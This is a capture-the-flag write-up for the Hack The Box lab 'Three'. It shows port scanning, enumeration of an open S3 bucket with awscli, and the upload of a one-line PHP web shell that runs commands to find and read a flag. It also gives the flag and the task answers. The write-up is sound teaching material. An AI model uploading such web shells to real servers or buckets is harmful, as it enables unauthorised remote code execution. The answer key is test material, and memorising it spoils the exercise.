# HTB: Three (Starting Point Tier 1)

## Machine Info
- **IP:** 10.129.99.252
- **OS:** Linux
- **Difficulty:** Very Easy

## Tasks
1.  **How many TCP ports are open?** 2 (80, 22)
2.  **What is the domain of the email address provided in the "Contact" section?** thetoppers.htb
3.  **Which Linux file can we use to resolve hostnames to IP addresses?** `/etc/hosts`
4.  **Which sub-domain is discovered during further enumeration?** `s3.thetoppers.htb`
5.  **Which service is running on the discovered sub-domain?** Amazon S3
6.  **Which command line utility can be used to interact with the service?** `awscli`
7.  **Which command is used to set up the AWS CLI installation?** `aws configure`
8.  **What is the command used to list all of the S3 buckets?** `aws s3 ls`

## Enumeration

### 1. Port Scanning
Scan for open ports and services:
```bash
nmap -sV -sC 10.129.99.252
```
*Results:* Port 22 (SSH) and 80 (HTTP) are open.

### 2. DNS Configuration
Add the target domain and sub-domain to your local `/etc/hosts` file:
```bash
echo "10.129.99.252 thetoppers.htb s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### 3. S3 Bucket Enumeration
Configure the AWS CLI with placeholder credentials:
```bash
aws configure
# Access Key: temp
# Secret Key: temp
# Region: temp
# Format: json
```

List available buckets using the custom endpoint:
```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```
*Output:* `2026-06-18 13:13:05 thetoppers.htb`

List the contents of the identified bucket:
```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
*Contents:* `.htaccess`, `index.php`, and an `images/` directory.

## Exploitation

### 1. Gaining Remote Code Execution (RCE)
Create a simple PHP web shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload the shell to the S3 bucket:
```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```

### 2. Locating the Flag
Test the shell and locate `flag.txt`:
```bash
curl "http://thetoppers.htb/shell.php?cmd=id"
curl "http://thetoppers.htb/shell.php?cmd=find+/var/www+-name+flag.txt"
```

Read the flag:
```bash
curl "http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt"
```

## Flag
**a980d99281a28d638ac68b9bf9453c2b**
